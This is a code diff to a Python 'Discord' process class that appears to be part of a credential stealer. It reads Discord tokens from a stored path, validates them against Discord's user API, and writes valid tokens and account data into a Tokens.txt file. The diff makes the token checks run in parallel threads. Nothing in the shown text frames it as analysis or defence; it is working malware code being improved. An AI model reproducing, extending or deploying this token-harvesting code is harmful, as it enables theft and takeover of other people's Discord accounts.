@@ -1,5 +1,6 @@
 from re import findall
 from json import loads
+from threading import Thread
 from multiprocessing import Process
 from os import listdir, path, makedirs
 from urllib.request import Request, urlopen
@@ -36,11 +37,20 @@ class Discord(Process):
 
         return headers
 
+    def __check_token(self, *args):
+
+        try:
+            query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=args[1]))
+            self.valid.append((args[0], query))
+        except:
+            self.invalid.append(args[0])
+
     def __get_tokens(self):
 
-        valid = []
-        invalid = []
         tokens = []
+
+        self.valid = []
+        self.invalid = []
 
         if not path.exists(self.config.TokensPath):
             return
@@ -59,18 +69,20 @@ class Discord(Process):
 
         self.__create_folder()
 
-        for token in tokens:
+        tasks = []
 
-            try:
-                query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=self.__get_headers(token)))
-                valid.append((token, query))
-            except:
-                invalid.append(token)
+        for token in tokens:
+            task = Thread(target=self.__check_token, args=[token, self.__get_headers(token)])
+            task.setDaemon(True)
+            task.start()
+            tasks.append(task)
+
+        for task in tasks:
+            task.join()
 
         temp = []
 
-        for result in valid:
-
+        for result in self.valid:
             storage = loads(result[1].read().decode("utf-8"))
             data = self.config.DiscordData
 
@@ -84,7 +96,7 @@ class Discord(Process):
 
         with open(rf"{self.storage_path}\{self.folder}\Tokens.txt", "a", encoding="utf-8") as discord:
 
-            discord.write("Invalid tokens:\n" + "\n".join(item for item in invalid) + "\n\nValid tokens:\n")
+            discord.write("Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n")
             discord.write("".join(item for item in temp))
 
     def run(self):
